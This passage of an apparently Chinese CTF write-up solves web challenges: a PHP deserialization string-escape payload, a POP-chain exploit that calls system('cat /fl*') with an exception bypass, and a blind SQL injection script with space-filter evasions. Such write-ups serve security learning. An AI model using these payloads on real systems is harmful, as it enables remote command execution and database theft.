punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>典型的 php 反序列化字符串逃逸，可以参考这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDcxMzU3MDY=">PHP 反序列化字符逃逸详解</span></p><p>这里直接借用官方 wp 的解释了，讲的真的很好！</p><ul><li><strong>解题步骤</strong></li></ul><p>本题考查字符变长的情况，主要关注点在于：</p><blockquote><p>function waf($str){</p><p>​ return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);</p><p>}</p></blockquote><p>这里我们可控的只有 key 的值，因此需要通过这里的字符长度的变化来修改序列化字符串，从而实现对于 cmd 值的控制。</p><p>举个栗子，在本题中如果我们传入 badbad，正常输出的序列化字符串如下：</p><blockquote s:3:key;s:6:badbad;s:3:cmd;s:6:whoami;=""><p>O:7:&quot;GetFlag&quot;:2:</p></blockquote><p>但是经过 waf 函数的替换后实际上传递给 unserialize 函数的字符串变成了：</p><blockquote s:3:key;s:6:goodgood;s:3:cmd;s:6:whoami;=""><p>O:7:&quot;GetFlag&quot;:2:</p></blockquote><p>注意这里的</p><p>s:6:&quot;goodgood&quot;;</p><p>PHP 在扫描序列化字符串的时候会根据字符串长度进行扫描，也就是此时只会扫描到 goodgo</p><p>而多出的 od&quot; 字符就会被抛弃，当然，此时的序列化字符串也因为这个原因变得不合法，因此我们需要利用这个特点来构造出合法的字符串去修改 cmd 的值。</p><p>例如我们想要构造的是：</p><blockquote><p>O:7:&quot;GetFlag&quot;:2:{s:3:&quot;key&quot;;s:N:&quot;N 个长度的字符串&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;}</p></blockquote><p>实际上我们输入的是：</p><p>N 个长度的字符串 &quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}</p><p>也就是说</p><blockquote><p>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}</p></blockquote><p>就是我们想要逃逸出去的字符，我们希望 N 个长度的字符串的长度恰好到双引号之前，此时我们的输入就会作为合法的序列化数据进行处理，后续原本的 &quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;} 就会被丢弃。</p><p>我们需要插入的字符总共有 22 位，因此需要逃逸出 22 个字符，一个 bad 可以逃逸出 1 个字符，因此需要 22 个 bad，构造 Exp 如下：</p><blockquote><p>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}</p></blockquote><p>此时实际上的反序列化数据是：</p><blockquote><p>O:7:&quot;GetFlag&quot;:2:{s:3:&quot;key&quot;;s:88:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;}&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;}</p></blockquote><p>good 的长度正好为 88，而 &quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;} 这一段数据就会被抛弃，由此完成了对于 cmd 值的修改。</p><p>顺着这个思路只需要计算需要逃逸的字符数量即可：</p><blockquote><p>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;}</p></blockquote><h3 id="more-fast"><a class="anchor" href="#more-fast">#</a> More Fast</h3><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">errMsg</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Not Flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token variable">$wel</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token property">good</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"NewStar"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"good job but nothing"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fast'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>Fatal error<span class="token punctuation">:</span> Uncaught Exception<span class="token punctuation">:</span> Nope in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">55</span> Stack trace<span class="token punctuation">:</span> <span class="token comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></pre></td></tr></table></figure><p>本题的 pop 链很简单：</p><blockquote><p>Start::__destruct -&gt; Crypto::__toString -&gt; Reverse::__get -&gt; Pwn::__invoke -&gt; Web::evil</p></blockquote><p>难点在于这个 throw new Exception (&quot;Nope&quot;); 抛出异常提前结束 destruct 函数，</p><p>关于如何绕过可以参考这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvd0tXVnFpTXo4S0FZMERBc1BtSjF3QQ==">php (phar) 反序列化漏洞及各种绕过姿势</span></p><p>payload:</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$errMsg</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pwn</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Reverse</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Web</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /fl*"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">errMsg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Crypto</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">errMsg</span> <span class="token operator">-></span> <span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">errMsg</span> <span class="token operator">-></span> <span class="token property">obj</span> <span class="token operator">-></span> <span class="token property">func</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">errMsg</span> <span class="token operator">-></span> <span class="token property">obj</span> <span class="token operator">-></span> <span class="token property">func</span> <span class="token operator">-></span> <span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>得到：</p><blockquote><p>a:2:{i:0;O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:8:&quot;cat /fl*&quot;;}}}}}i:1;N;}</p></blockquote><p>把 i:1;N 改成 i:0;N，或者 i:0;O 给成 i:1;O</p><blockquote><p>a:2:{i:0;O:5:&quot;Start&quot;:1:{s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:{s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:{s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:{s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:{s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:8:&quot;cat /fl*&quot;;}}}}}i:0;N;}</p></blockquote><p>传参后得到 flag。</p><h3 id="midsql"><a class="anchor" href="#midsql">#</a> midsql</h3><p>老朋友了，这次是：sql 时间盲注 + 过滤了空格</p><p>测试输入框，发现过滤了空格，其他没有过滤，页面没有回显</p><blockquote><p>preg_match(&quot;/( |\n|\x0a)/is&quot;, $_REQUEST[&quot;id&quot;]) ||</p><p>preg_match(&quot;/[=\x09\xa0\x0a\x0b\x0c\x0d\x0e]/&quot;, $_REQUEST[&quot;id&quot;])</p></blockquote><p>使用 /**/ 即可进行时间盲注</p><p>这里可以直接参考官方 wp:</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> copy</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">return</span> self</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_val<span class="token punctuation">,</span> exc_tb<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> string<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        result <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_char_ascii</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> string<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        method1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'(Ord(right(left(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>string<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">),1)))'</span></span></pre></td></tr><tr><td data-num="21"></td><td><pre>        method2 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'(Ord(substr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>string<span class="token punctuation">&#125;</span></span><span class="token string">/**/from/**/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">/**/for/**/1)))'</span></span></pre></td></tr><tr><td data-num="22"></td><td><pre>        method3 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'(Ord(sUbstr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>string<span class="token punctuation">&#125;</span></span><span class="token string"> frOm </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string"> fOr 1)))'</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">return</span> method2</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">table_name_in_db</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string">'(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        s2 <span class="token operator">=</span> <span class="token string">'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        s3 <span class="token operator">=</span> <span class="token string">'(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In(dAtabase())))'</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">return</span> s3</pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">table_name_in_db2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> schema_name<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string">'(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        s2 <span class="token operator">=</span> <span class="token string">'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        s3 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>schema_name<span class="token punctuation">&#125;</span></span><span class="token string">')))"</span></span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token keyword">return</span> s3</pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">db_names</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string">'(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        s2 <span class="token operator">=</span> <span class="token string">'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))'</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        s3 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(sElect(group_coNcat(sChema_name))from(information_schema.schemata))"</span></span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">return</span> s3</pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">column_name_in_table</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> table_name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(select(group_concat(column_name))from(infOrmation_schema.columns)where(table_name)in('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">'))"</span></span></pre></td></tr><tr><td data-num="45"></td><td><pre>        s2 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(sElect(group_cOncat(Column_name))frOm(infOrmation_schema.cOlumns)wHere(table_name)In(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>str2hex<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))"</span></span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">return</span> s2</pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">column_value_in_table</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> table_name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> column_name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"(sElect(grOup_cOncat(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>column_name<span class="token punctuation">&#125;</span></span><span class="token string">))frOm(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table_name<span class="token punctuation">&#125;</span></span><span class="token string">))"</span></span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">return</span> s1</pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_len</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> function<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        s1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'(lenGth(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>function<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">))'</span></span></pre></td></tr><tr><td 